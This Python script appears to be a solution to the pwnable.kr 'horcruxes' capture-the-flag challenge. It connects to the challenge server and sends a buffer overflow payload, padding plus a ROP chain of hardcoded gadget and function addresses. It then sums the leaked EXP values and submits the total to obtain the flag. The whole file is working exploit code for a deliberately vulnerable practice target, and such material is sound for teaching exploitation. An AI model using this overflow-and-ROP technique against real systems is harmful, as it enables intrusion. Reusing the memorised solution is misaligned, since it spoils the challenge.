import struct
import pwn
import socket

IP = 'pwnable.kr'
PORT = 9032
USER = 'horcruxes'
PASSWORD = 'guest'
CHUNK = 2048

A_ADDR = 0x809fe4b
B_ADDR = 0x809fe6a
C_ADDR = 0x809fe89
D_ADDR = 0x809fea8
E_ADDR = 0x809fec7
F_ADDR = 0x809fee6
G_ADDR = 0x809ff05
RET_GADGET = 0x809fe69
CALL_ROPME_ADDR = 0x809fffc

def extractResult (data):
	rows = data.split ('\n')

	print ('Starting calculations')
	result = 0
	for row in rows:
		if row[-1] != ')':
			continue
		else:
			plusIndex = row.find ('+')
			numString = row[plusIndex+1:-1]
			print (numString)
			result += int (numString)
			print (result)

	result = str(result)
	result += '\n'
	print ('result is: {}'.format (result))
	return result

def main():

	s = socket.socket()
	s.connect ((IP,PORT))

	selectString = 'Select Menu:'
	expString = 'How many EXP'
	payload = ''
	secondPayload = ''
	payload += 'A' * 121
	payload += struct.pack ("<I", RET_GADGET)
	payload += struct.pack ("<I", A_ADDR)
	payload += struct.pack ("<I", RET_GADGET)
	payload += struct.pack ("<I", B_ADDR)
	payload += struct.pack ("<I", RET_GADGET)
	payload += struct.pack ("<I", C_ADDR)
	payload += struct.pack ("<I", RET_GADGET)
	payload += struct.pack ("<I", D_ADDR)
	payload += struct.pack ("<I", RET_GADGET)
	payload += struct.pack ("<I", E_ADDR)
	payload += struct.pack ("<I", RET_GADGET)
	payload += struct.pack ("<I", F_ADDR)
	payload += struct.pack ("<I", RET_GADGET)
	payload += struct.pack ("<I", G_ADDR)
	payload += struct.pack ("<I", RET_GADGET)
	payload += struct.pack ("<I", CALL_ROPME_ADDR)

	payload += '\n'
	payload += '1\n'
	
	# Print welcome
	data = s.recv (CHUNK)
	print (data)
	# Print Select menu
	data = s.recv (CHUNK)
	print (data)

	s.send (payload)

	# Print exit main routine message
	data = s.recv (CHUNK)
	print (data)
	
	# Print horocruxes messages
	data = s.recv (CHUNK)
	print (data)
	
	result = extractResult (data)

	s.send (result)

	# Print flag message
	data = s.recv (CHUNK)
	print (data)


if __name__ == '__main__':
	main()